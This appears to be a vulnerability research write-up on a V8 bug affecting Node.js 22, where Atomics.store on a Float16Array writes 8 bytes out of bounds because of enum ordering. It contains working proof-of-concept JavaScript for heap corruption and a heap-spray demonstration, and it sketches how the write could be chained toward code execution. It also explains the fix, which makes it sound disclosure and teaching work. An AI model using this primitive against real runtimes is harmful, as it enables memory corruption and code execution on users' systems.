## TL;DR

I found a vulnerability in V8 (the JavaScript engine powering Chrome and Node.js) where `Atomics.store()` on a `Float16Array` performs an 8-byte BigInt64 write instead of the expected 2-byte Float16 write. This enables out-of-bounds heap writes up to 3x the buffer size, with full control over the written value. The bug affects Node.js 22 LTS.

## The Hunt

I've been doing research on V8 12.4.254.21 (as shipped in Node.js 22 LTS). My approach: target experimental or recently-added features, since they've had less time to be hardened (hopefully).

Float16Array caught my attention immediately. Added to V8 in March 2024 via [CL 5082566](https://chromium-review.googlesource.com/c/v8/v8/+/5082566), it touched 80+ files across the engine. That's a lot of surface area. Behind the `--js-float16array` flag in Node.js 22, it later shipped by default in Chrome 135 (April 2025).

## Bug #1: Atomics.load Crashes with SIGILL

My first test was simple: what happens when you use Float16Array with APIs designed for integer typed arrays?

```javascript
Atomics.load(new Float16Array(new SharedArrayBuffer(2)), 0);
// → Exit code 133 (SIGILL — Illegal Instruction)
```

The process crashes with `SIGILL`. Root cause: the CSA (CodeStubAssembler) `Switch` in `builtins-sharedarraybuffer-gen.cc` handles 8 integer element kinds, but Float16 isn't one of them. The default case calls `Unreachable()` which emits a `ud2` instruction.

But SIGILL is just a DoS bug. I simply wanted more

## Finding Bug #2: Atomics.store Accepts BigInt

I tested every Atomics operation on Float16Array:

```
Atomics.store(f16, 0, 1)   → TypeError: Cannot convert 1 to a BigInt
Atomics.store(f16, 0, 1n)  → SUCCEEDED (?!)
Atomics.load(f16, 0)       → SIGILL crash
Atomics.exchange(f16, 0, 1) → SIGILL crash
```

Wait — `Atomics.store` with a BigInt value *succeeds*? That's not supposed to happen. Float16Array is a float type, not a BigInt type. Let me look at what actually gets written:

```javascript
const sab = new SharedArrayBuffer(64);
const f16 = new Float16Array(sab); // 32 elements, 2 bytes each
const u8 = new Uint8Array(sab);

for (let i = 0; i < 64; i++) u8[i] = 0;
Atomics.store(f16, 0, 0x4142434445464748n);

console.log(Array.from(u8.slice(0, 8)).map(x => x.toString(16)));
// Output: ['48', '47', '46', '45', '44', '43', '42', '41']
```

**8 bytes written.** A Float16 element is 2 bytes. But this wrote 8 bytes — a full BigInt64 store. Elements `f16[1]`, `f16[2]`, and `f16[3]` are all corrupted with attacker-controlled data.

## The Root Cause: Enum Ordering Bug

In V8 12.4, the `ElementsKind` enum places `FLOAT16_ELEMENTS` at position 6 — between `INT32_ELEMENTS` (5) and `BIGUINT64_ELEMENTS` (7):

```
UINT8(0), INT8(1), UINT16(2), INT16(3), UINT32(4), INT32(5),
→ FLOAT16(6),
BIGUINT64(7), BIGINT64(8), UINT8_CLAMPED(9), FLOAT32(10), FLOAT64(11)
```

This causes two failures in `builtins-sharedarraybuffer-gen.cc`:

**1. ValidateIntegerTypedArray doesn't reject Float16:**

```cpp
// Line 133-136: Range check
Branch(Int32LessThanOrEqual(elements_kind,
    Int32Constant(LAST_VALID_ATOMICS_TYPED_ARRAY_ELEMENTS_KIND)), // = BIGINT64 = 8
    &not_float_or_clamped, &invalid);
```

`FLOAT16 = 6 <= BIGINT64 = 8` → TRUE → Float16 passes validation!

Compare: `FLOAT32 = 10 <= 8` → FALSE → correctly rejected.

**2. AtomicsStore routes Float16 to the BigInt64 path:**

```cpp
// Line 357: Value conversion branching
GotoIf(Int32GreaterThan(elements_kind, Int32Constant(INT32_ELEMENTS)), &u64);
```

`FLOAT16 = 6 > INT32 = 5` → TRUE → takes the BigInt64 store path!

The BigInt64 path then:
1. Calls `ToBigInt(value)` — succeeds for BigInt input
2. Calls `AtomicStore64(backing_store, WordShl(index_word, 3), ...)` — stores 8 bytes at offset `index * 8`

## Escalation: OOB Heap Write

The BigInt64 stride (`index * 8`) vs Float16 stride (`index * 2`) creates a 4x offset amplification. For a 16-byte SharedArrayBuffer with 8 Float16 elements:

| Index | Float16 offset | BigInt64 offset | Status |
|-------|---------------|-----------------|--------|
| 0     | 0             | 0               | In bounds |
| 1     | 2             | 8               | In bounds |
| 2     | 4             | 16              | **8 bytes OOB** |
| 7     | 14            | 56              | **48 bytes OOB** |

The OOB range scales as **3x the buffer size**.

```javascript
const sab = new SharedArrayBuffer(16);
const f16 = new Float16Array(sab);

// All these writes go PAST the 16-byte buffer!
for (let i = 2; i <= 7; i++) {
    Atomics.store(f16, i, 0x4141414141414141n);
}
// → free(): invalid next size (fast)
// → Exit code 134 (SIGABRT)
```

The process crashes with a glibc heap corruption error — we've overwritten malloc chunk metadata.

## Proving Controlled Corruption

To prove this isn't just a crash but a controllable primitive:

```javascript
// Spray adjacent objects
const canaries = [];
for (let i = 0; i < 256; i++) {
    const ab = new ArrayBuffer(16);
    new DataView(ab).setFloat64(0, 0, true);
    new DataView(ab).setFloat64(8, 0, true);
    canaries.push({ab, dv: new DataView(ab)});
}

const sab = new SharedArrayBuffer(64);
const f16 = new Float16Array(sab);

// Write our signature OOB
const SIGNATURE = 0x0000C0DEDEADBEEFn;
for (let idx = 8; idx < 32; idx++) {
    try { Atomics.store(f16, idx, SIGNATURE); } catch(e) { break; }
}

// Check adjacent objects
for (const c of canaries) {
    if (c.dv.getBigUint64(0, true) === SIGNATURE) {
        console.log("CONTROLLED CORRUPTION: signature found in adjacent object");
    }
}
```

Result: `CONTROLLED CORRUPTION: signature found in adjacent object`. Our exact 8-byte value was written into a neighboring heap allocation.

## The Primitive

| Property | Value |
|----------|-------|
| Write size | 8 bytes (BigInt64) |
| Value control | Full (any 64-bit BigInt) |
| Offset control | `index * 8` (stride of 8) |
| Alignment | 8-byte aligned |
| Max OOB | 3x buffer size |
| Atomicity | Sequentially consistent |

This is a strong exploitation primitive. With heap spraying, an attacker can:
1. Position target objects adjacent to the vulnerable buffer
2. Corrupt specific fields (lengths, pointers, metadata)
3. Chain with an info leak for full code execution

## Impact

- **Node.js 22 LTS** (Active LTS until October 2025): Vulnerable with `--js-float16array`
- **Chrome**: Fixed before Float16Array shipped in Chrome 135 (April 2025)
- The fix moved `FLOAT16_ELEMENTS` to position 11 in the enum, outside the valid atomics range

## The Fix

In newer V8 versions, the `TYPED_ARRAYS` macro was reorganized to place Float16 after Float64:

```
UINT8, INT8, UINT16, INT16, UINT32, INT32, BIGUINT64, BIGINT64,
UINT8_CLAMPED, FLOAT32, FLOAT64, FLOAT16  ← moved to end
```

Now `FLOAT16 = 11 > BIGINT64 = 7`, so `ValidateIntegerTypedArray` correctly rejects it, and the `GotoIf` at line 357 is harmless because Float16 never reaches it.

## Lessons Learned

1. **Target new features.** Float16Array was the newest TypedArray kind, and its integration with pre-existing infrastructure (Atomics, TurboFan, Maglev) had gaps.

2. **Enum ordering matters.** The entire bug stems from where `FLOAT16_ELEMENTS` was inserted in an enumeration. Range-based validity checks assumed a specific ordering that broke when a new element was added in the middle.

3. **Test the boundaries.** The Atomics API is designed for integer typed arrays. Testing it with float typed arrays revealed that the validation wasn't airtight for the newest float type.

4. **Follow the crash.** The initial SIGILL crash in `Atomics.load` was just a DoS. But investigating *why* it crashed led to understanding *why* `Atomics.store` didn't crash — and that led to the OOB write.

---

*This research was conducted on Node.js 22.22.0 (V8 12.4.254.21-node.33) running on Kali Linux.*
